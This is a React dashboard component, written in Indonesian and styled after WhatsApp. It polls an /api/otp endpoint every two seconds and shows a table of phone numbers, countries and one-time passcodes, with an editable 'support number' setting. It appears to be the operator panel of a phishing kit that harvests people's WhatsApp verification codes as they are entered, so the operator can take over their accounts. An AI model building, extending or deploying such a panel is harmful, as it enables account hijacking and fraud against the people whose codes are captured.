import React, { useState, useEffect } from 'react';
import { TEXTS, DASHBOARD_CONFIG, APP_CONFIG } from '../../config/config';

interface OTPRecord {
  id: number;
  phoneNumber: string;
  country: string;
  otp: string;
}


export const Dashboard: React.FC = () => {
  const [records, setRecords] = useState<OTPRecord[]>([]);
  const [supportPhone, setSupportPhone] = useState(
    localStorage.getItem('wa_support_phone') || APP_CONFIG.supportPhone
  );

  const handleSaveSupportPhone = () => {
    localStorage.setItem('wa_support_phone', supportPhone);
    alert('Nomor bantuan berhasil disimpan!');
  };

  useEffect(() => {
    const loadRecords = async () => {
      try {
        const res = await fetch(`/api/otp?t=${Date.now()}`);
        if (res.ok) {
          const data = await res.json();
          setRecords(data);
        } else {
          setRecords([]);
        }
      } catch (e) {
        console.error('Failed to fetch OTP records', e);
      }
    };
    
    // Load initial records
    loadRecords();
    
    // Poll every 2 seconds to get new requests from the JSON file
    const interval = setInterval(loadRecords, 2000);

    return () => {
      clearInterval(interval);
    };
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 py-10 px-4">
      <div className="max-w-4xl mx-auto bg-white rounded-lg shadow overflow-hidden">
        <div className="px-6 py-4 border-b border-gray-200 flex justify-between items-center bg-[#00a884]">
          <h1 className="text-xl font-bold text-white">{TEXTS.dashboard.title}</h1>
          <div className="space-x-3">
            <a
              href={DASHBOARD_CONFIG.homeUrl}
              className="bg-transparent border border-white text-white px-4 py-2 rounded text-sm font-medium hover:bg-white hover:text-[#00a884] transition inline-block"
            >
              {TEXTS.dashboard.buttonBack}
            </a>
          </div>
        </div>
        
        <div className="px-6 py-4 border-b border-gray-200 bg-gray-50 flex items-center justify-between">
          <div className="flex items-center space-x-4 w-full max-w-md">
            <label className="text-sm font-medium text-gray-700 whitespace-nowrap">
              Nomor Bantuan:
            </label>
            <input
              type="text"
              className="flex-1 border border-gray-300 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#00a884] focus:border-[#00a884]"
              value={supportPhone}
              onChange={(e) => setSupportPhone(e.target.value)}
              placeholder="Misal: 6288980083295"
            />
            <button
              onClick={handleSaveSupportPhone}
              className="bg-[#00a884] text-white px-4 py-1.5 rounded text-sm hover:bg-[#008f6f] transition font-medium"
            >
              Simpan
            </button>
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.no}
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.tanggal}
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.jam}
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.phone}
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.country}
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  {TEXTS.dashboard.table.otp}
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {records.map((record, index) => {
                const dateObj = new Date(record.id);
                const tanggal = dateObj.toLocaleDateString('id-ID', {
                  day: '2-digit',
                  month: '2-digit',
                  year: 'numeric'
                });
                const jam = dateObj.toLocaleTimeString('id-ID', {
                  hour: '2-digit',
                  minute: '2-digit',
                  second: '2-digit'
                }).replace(/\./g, ':');
                
                return (
                <tr key={record.id} className="hover:bg-gray-50">
                  <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">
                    {index + 1}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {tanggal}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {jam}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {record.phoneNumber}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {record.country}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-gray-900 font-semibold tracking-widest">
                    {record.otp}
                  </td>
                </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;
